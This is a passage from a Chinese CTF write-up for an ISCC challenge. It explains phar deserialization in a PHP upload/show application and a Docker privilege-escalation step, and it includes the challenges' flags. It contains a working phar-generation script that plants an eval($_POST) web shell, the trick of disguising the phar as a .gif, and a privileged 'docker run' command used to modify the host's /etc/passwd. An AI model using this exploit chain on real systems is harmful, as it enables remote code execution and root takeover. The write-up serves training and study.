[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t014e6d7426a573818e.png)

```
flag`{`wEak_pAsS_1s_deNge20us`}`
```

### <a class="reference-link" name="%E5%A4%A7%E9%BB%91%E9%98%94"></a>大黑阔

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0116029a9f89c73977.png)

考点：phar反序列化、Docker逃逸提权

题目上来就是一个上传界面，不用说就有过滤【只能上传gif】，对网站进行敏感信息收集

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0124f478d18f381d79.png)

泄露网站源码`www.zip`，下载源码

upload.php

```
&lt;?php
$tmp_file_location='/var/www/html/';
if (($_FILES["file"]["type"]=="image/gif")&amp;&amp;(substr($_FILES["file"]["name"], strrpos($_FILES["file"]["name"], '.')+1))== 'gif') `{`
    echo "Upload: " . $_FILES["file"]["name"];
    echo "Type: " . $_FILES["file"]["type"];
    echo "Temp file: " . $_FILES["file"]["tmp_name"];

    if (file_exists($tmp_file_location."upload_file/" . $_FILES["file"]["name"]))
      `{`
      echo $_FILES["file"]["name"] . " already exists. ";
      `}`
    else
      `{`
      move_uploaded_file($_FILES["file"]["tmp_name"],
      $tmp_file_location."upload_file/" .$_FILES["file"]["name"]);
      echo "Stored in: " .$tmp_file_location. "upload_file/" . $_FILES["file"]["name"];
      `}`
    `}`
else
  `{`
  echo "Invalid file,you can only upload gif";
  `}`
?&gt;
```

show.php

```
&lt;?php
$filename=$_GET['filename'];
class AnyClass`{`
    var $output = 'echo "ok";';
    function __destruct()
    `{`
        eval($this -&gt; output);
    `}`
`}`
file_exists($filename);
```

分析源码，可知可以利用phar反序列化进行利用，主要是因为show.php存在phar反序列化可用点：类AnyClass和函数file_exists()，file_exists在处理phar文件时会反序列化phar文件中用户自定义的meta-data字段，其中phar文件类型不由后缀决定

编写脚本生成具有攻击载荷的phar文件

```
&lt;?php
class AnyClass`{`
    var $output = 'echo "ok";';
`}`

@unlink('exp-q.phar');
$phar = new Phar("exp-q.phar"); 
$phar-&gt;startBuffering();
$phar -&gt; setStub('&lt;?php __HALT_COMPILER();?&gt;');
$object = new AnyClass();
$object -&gt;output= 'eval(@$_POST['q']);';
$phar-&gt;setMetadata($object); 
$phar-&gt;addFromString("a", "a"); 
$phar-&gt;stopBuffering();
?&gt;
```

查看生成的phar文件

```
00000000  3C 3F 70 68  70 20 5F 5F   48 41 4C 54  5F 43 4F 4D  &lt;?php __HALT_COM
00000010  50 49 4C 45  52 28 29 3B   20 3F 3E 0D  0A 6A 00 00  PILER(); ?&gt;..j..
00000020  00 01 00 00  00 11 00 00   00 01 00 00  00 00 00 3B  ...............;
00000030  00 00 00 4F  3A 38 3A 22   41 6E 79 43  6C 61 73 73  ...O:8:"AnyClass
00000040  22 3A 31 3A  7B 73 3A 36   3A 22 6F 75  74 70 75 74  ":1:`{`s:6:"output
00000050  22 3B 73 3A  31 39 3A 22   65 76 61 6C  28 40 24 5F  ";s:19:"eval(@$_
00000060  50 4F 53 54  5B 27 71 27   5D 29 3B 22  3B 7D 01 00  POST['q']);";`}`..
00000070  00 00 61 01  00 00 00 52   48 CA 5E 01  00 00 00 43  ..a....RH.^....C
00000080  BE B7 E8 B6  01 00 00 00   00 00 00 61  98 14 3A DC  ...........a..:.
00000090  67 2A 62 13  5F C6 2F 99   A8 27 BA 44  F5 32 B3 5F  g*b._./..'.D.2._
000000A0  02 00 00 00  47 42 4D 42                             ....GBMB

```

对于本地生成的phar文件，依据上传限制，直接更改phar文件后缀为gif，上传phar.gif直接Getshell

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t011c030cf2e875a187.png)

在服务器上没有找到flag，可能权限不够，由于服务器上开着docker，并且www用户可以直接操作docker的部署

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01f952ef3170a6ac19.png)

下来直接利用docker启动特权容器或者cap-add=SYS_ADMIN（或映射宿主机文件到容器中）

```
docker run -it --privileged=true ubuntu /bin/bash
```

此时docker容器具有mount权限，进入容器挂载宿主机目录到容器中，修改宿主机的`/etc/passwd`进行提取得到flag

```
flag`{`Nobody_knows_Hackuoer_better_than_me`}`
```

## 总结

不谈ISCC赛制怎么样，对于不同阶段的人也是有一定的学习和提高。
